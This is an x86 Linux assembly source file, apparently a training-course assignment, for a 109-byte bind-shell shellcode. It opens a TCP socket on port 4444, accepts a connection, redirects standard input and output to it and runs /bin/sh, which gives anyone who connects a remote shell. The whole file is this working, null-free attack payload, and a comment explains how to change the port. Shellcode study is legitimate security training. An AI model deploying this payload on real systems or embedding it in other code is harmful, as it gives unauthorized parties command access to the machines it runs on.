;coded by SLAE - 513 - Andriy Brukhovetskyy
;Bind port 4444 - last 2 bytes
;syscall numbers can be found here /usr/include/asm/unistd_32.h
;socketcall man - http://www.tutorialspoint.com/unix_sockets/socket_core_functions.htm
;socket families definitions can be locked here: /usr/src/<tab>/include/linux/socket
;or we can use python socket modude - example socket.AF_INET
;Values needed to configure socket can be found here:
;/usr/include/linux/net.h
;109 bytes long 


global _start
section .text

_start:
        ;int socket (int family, int type, int protocol);
	xor eax, eax
	mov al, 102     ; socketcall
	xor ebx, ebx
	mov bl, 1	; 1 = SYS_SOCKET socket()
	push BYTE 6	; IPPROTO_TCP - int protocol
	push BYTE 1	; SOCK_STREAM - int type
	push BYTE 2	; AF_INET     - int domain
	mov ecx, esp	; ECX - PTR to arguments for socket()
	int 0x80
	mov esi, eax	; save socket fd in ESI for later

	jmp short jmp_call_pop
body:
	pop edi		; getting port address from ESP, putted by call in jmp_call_pop

        ;int bind(int sockfd, struct sockaddr *my_addr,int addrlen);
	push BYTE 102
	pop eax		; socketcall
	inc ebx		; 2 = SYS_BIND bind()
	xor edx, edx
	push edx	; 0 = ANY HOST (0.0.0.0)};
	push WORD [edi]	; PORT specified at the end. Last two bytes in HEX.
	push WORD bx	; 2 = AF_INET - struct sockaddr short sin_family,
	mov ecx, esp	; Save PTR to sockaddr struct in ECX
	push BYTE 16	; socklen_t addrlen
	push ecx	; const struct sockaddr *addr
	push esi	; int sockfd
	mov ecx, esp	; ECX = PTR to arguments for bind()
	int 0x80
        
        ;int listen(int sockfd,int backlog);
	mov BYTE al, 102; socketcall
	inc ebx
	inc ebx		; 4 = SYS_LISTEN listen()
	push BYTE 1	; int backlog
	push esi	; int sockfd,
	mov ecx, esp	; ECX = PTR to arguments for listen()
	int 0x80

        ;int accept (int sockfd, struct sockaddr *cliaddr, socklen_t *addrlen);
	mov BYTE al, 102; socketcall
	inc ebx		; 5 = SYS_ACCEPT = accept()
	push edx	; socklen_t *addrlen = 0
	push edx	; struct sockaddr *cliaddr = NULL
	push esi	; int sockfd,
	mov ecx, esp	; ECX = PTR to arguments for accept()
	int 0x80

	; dup2 to duplicate sockfd, that will attach the client to a shell and redirrect STDIN, STDOUT, STRERRR
	; that we'll spawn below in execve syscall
	xchg eax, ebx	; after EBX = sockfd, EAX = 5
	push BYTE 3
	pop ecx

dup2_loop:
        dec ecx
	mov BYTE al, 63
	int 0x80
	jnz dup2_loop ; jump if not 0

	; spawning as shell
	xor eax, eax
	push eax
	; '/bin//sh'[::1] <- reverse mode
        push 0x68732f2f ; hs//
        push 0x6e69622f ; nib/
	mov ebx, esp
	push eax
	mov edx, esp	; ESP is now pointing to EDX
	push ebx
	mov ecx, esp
	mov al, 11	; execve syscall
	int 0x80

jmp_call_pop:
	call body
	db 0x11, 0x5c	; port 4444 you can put any 0 free port
